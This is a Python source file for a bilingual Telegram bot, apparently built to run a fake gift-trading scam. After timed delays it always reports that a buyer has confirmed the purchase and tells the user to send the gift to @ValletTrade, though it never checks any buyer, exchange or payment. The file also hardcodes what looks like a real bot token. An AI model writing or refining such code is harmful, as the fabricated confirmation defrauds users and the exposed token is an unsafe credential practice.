import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8669209199:AAFnRG3FG4q0KpR7T-bk_THhpAhEltz_H7U"

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Инициализация бота
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ==================== СОСТОЯНИЯ ====================
class TradeStates(StatesGroup):
    waiting_for_exchange = State()
    waiting_for_price = State()
    waiting_for_confirmation = State()

# ==================== КОМАНДЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    """Обработчик команды /start"""
    await state.set_state(TradeStates.waiting_for_exchange)
    await message.answer(
        "🤖 *Добро пожаловать в Trade Bot!*\n"
        "📝 Напишите номер обмена:\n\n"
        "🤖 *Welcome to Trade Bot!*\n"
        "📝 Enter the exchange number:",
        parse_mode="Markdown"
    )

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    """Обработчик команды /cancel"""
    current_state = await state.get_state()
    if current_state is None:
        await message.answer(
            "❌ Нет активных операций для отмены.\n"
            "❌ No active operations to cancel."
        )
        return
    
    await state.clear()
    await message.answer(
        "❌ Операция отменена.\n"
        "Для начала введите /start\n\n"
        "❌ Operation cancelled.\n"
        "To start, enter /start"
    )

# ==================== ОСНОВНАЯ ЛОГИКА ====================
@dp.message(TradeStates.waiting_for_exchange)
async def process_exchange_number(message: types.Message, state: FSMContext):
    """Обработка номера обмена с задержкой 20 секунд"""
    # Проверяем, что введено число
    if not message.text.isdigit():
        await message.answer(
            "❌ Пожалуйста, введите номер обмена *цифрами*:\n"
            "❌ Please enter the exchange number *in digits*:",
            parse_mode="Markdown"
        )
        return
    
    # Сохраняем номер обмена
    await state.update_data(exchange_number=message.text)
    
    # Отправляем сообщение о подключении
    await message.answer(
        f"✅ *Вы успешно подключились к обмену #{message.text}*\n"
        f"⏳ Ожидайте 20 секунд...\n\n"
        f"✅ *You successfully connected to exchange #{message.text}*\n"
        f"⏳ Please wait 20 seconds...",
        parse_mode="Markdown"
    )
    
    # ⏳ ЗАДЕРЖКА 20 СЕКУНД
    await asyncio.sleep(20)
    
    # Проверяем, не отменили ли операцию
    current_state = await state.get_state()
    if current_state != TradeStates.waiting_for_exchange:
        return
    
    # Переходим к следующему шагу
    await state.set_state(TradeStates.waiting_for_price)
    
    await message.answer(
        f"💰 Сколько хотите за подарок? (в долларах)\n"
        f"💰 How much do you want for the gift? (in dollars)",
        parse_mode="Markdown"
    )

@dp.message(TradeStates.waiting_for_price)
async def process_price(message: types.Message, state: FSMContext):
    """Обработка суммы с задержкой 60 секунд"""
    # Проверяем, что введено число
    try:
        price = float(message.text.replace(',', '.'))
        if price <= 0:
            await message.answer(
                "❌ Сумма должна быть *больше 0*:\n"
                "❌ Amount must be *greater than 0*:",
                parse_mode="Markdown"
            )
            return
    except ValueError:
        await message.answer(
            "❌ Пожалуйста, введите *число* (например: 100 или 150.50):\n"
            "❌ Please enter a *number* (e.g., 100 or 150.50):",
            parse_mode="Markdown"
        )
        return
    
    # Сохраняем сумму
    await state.update_data(price=price)
    
    # Форматируем сумму
    if price.is_integer():
        price_str = f"${int(price)}"
    else:
        price_str = f"${price:.2f}"
    
    # Отправляем сообщение о подтверждении
    await message.answer(
        f"⏳ *Ожидание подтверждения покупки...*\n"
        f"💰 Сумма: {price_str}\n"
        f"⏳ *Waiting for purchase confirmation...*\n"
        f"💰 Amount: {price_str}",
        parse_mode="Markdown"
    )
    
    # Переходим в состояние ожидания подтверждения
    await state.set_state(TradeStates.waiting_for_confirmation)
    
    # ⏳ ЗАДЕРЖКА 60 СЕКУНД
    await asyncio.sleep(60)
    
    # Проверяем, не отменили ли операцию
    current_state = await state.get_state()
    if current_state != TradeStates.waiting_for_confirmation:
        return
    
    # Получаем данные
    data = await state.get_data()
    exchange_number = data.get('exchange_number')
    final_price = data.get('price')
    
    # Форматируем финальную сумму
    if final_price.is_integer():
        final_price_str = f"${int(final_price)}"
    else:
        final_price_str = f"${final_price:.2f}"
    
    # Отправляем финальное сообщение
    await message.answer(
        f"✅ *Покупатель подтвердил покупку!*\n"
        f"📦 Отправьте подарок: @ValletTrade\n\n"
        f"📋 *Детали обмена:*\n"
        f"└ Номер: #{exchange_number}\n"
        f"└ Сумма: {final_price_str}\n\n"
        f"✅ *Buyer confirmed the purchase!*\n"
        f"📦 Send the gift to: @ValletTrade\n\n"
        f"📋 *Exchange details:*\n"
        f"└ Number: #{exchange_number}\n"
        f"└ Amount: {final_price_str}",
        parse_mode="Markdown"
    )
    
    # Очищаем состояние
    await state.clear()

# ==================== ОБРАБОТКА ЛЮБЫХ СООБЩЕНИЙ ====================
@dp.message()
async def handle_all_messages(message: types.Message, state: FSMContext):
    """Обработка любых сообщений, если нет активного состояния"""
    current_state = await state.get_state()
    
    # Если нет активного состояния - предлагаем начать
    if current_state is None:
        # Проверяем, может это номер обмена?
        if message.text.isdigit() and len(message.text) >= 3:
            # Если пользователь ввел число - автоматически начинаем
            await state.set_state(TradeStates.waiting_for_exchange)
            # Перенаправляем на обработчик номера
            await process_exchange_number(message, state)
        else:
            await message.answer(
                "❓ Я не понимаю эту команду.\n"
                "Для начала работы введите /start\n"
                "Для отмены операции введите /cancel\n\n"
                "❓ I don't understand this command.\n"
                "To start, enter /start\n"
                "To cancel, enter /cancel"
            )
        return
    
    # Если есть состояние, но сообщение не обработано - игнорируем
    await message.answer(
        "⏳ Пожалуйста, следуйте инструкциям бота.\n"
        "⏳ Please follow the bot's instructions."
    )

# ==================== ЗАПУСК БОТА ====================
async def main():
    """Главная функция запуска бота"""
    print("=" * 50)
    print("🤖 TRADE BOT ЗАПУЩЕН!")
    print("⏳ Задержка после номера: 20 секунд")
    print("⏳ Задержка после суммы: 60 секунд")
    print("💰 Валюта: Доллары ($)")
    print("🌐 Языки: Русский / English")
    print("=" * 50)
    
    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
